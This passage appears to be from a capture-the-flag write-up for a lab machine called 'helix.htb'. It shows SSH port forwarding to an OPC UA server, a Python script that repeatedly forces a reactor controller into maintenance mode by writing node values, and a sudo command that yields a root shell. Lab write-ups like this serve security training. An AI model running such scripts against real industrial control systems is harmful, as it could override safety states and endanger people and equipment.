The OPC UA Server runs on port 4840. We can close our active ssh session and port forward with a new one.
```terminal
ssh -i sshkey -L 4840:127.0.0.1:4840 operator@helix.htb
```
We need to get a Maintenance window so we can run helix-maint-console to get dropped into a root shell.
This script sets the correct values to hold the reactor in maintenance mode.

![Helix](helix2.png)
```terminal
#!/usr/bin/env python3
"""Hold reactor in maintenance window indefinitely"""
from opcua import Client
import time

client = Client("opc.tcp://127.0.0.1:4840/helix/")
client.connect()
print("[+] Connected - holding window open. Ctrl+C to stop.")

client.get_node("ns=2;i=12").set_value("MAINTENANCE")
client.get_node("ns=2;i=13").set_value(True)
client.get_node("ns=2;i=6").set_value(11.0)

while True:
        temp = client.get_node("ns=2;i=4").get_value()
        trip = client.get_node("ns=2;i=10").get_value()
        print(f" temp={temp:.2f} trip={trip}", end="\r")
        # Re-assert values in case PLC resets them
        client.get_node("ns=2;i=12").set_value("MAINTENANCE")
        client.get_node("ns=2;i=13").set_value(True)
        client.get_node("ns=2;i=6").set_value(11.0)
        time.sleep(2)
```
You need to install the opcua python library.
```terminal
pip install opcua
```

This will be run on the attacker machine. After running the script, you will be able to run.

```terminal
sudo /usr/local/sbin/helix-maint-console
```
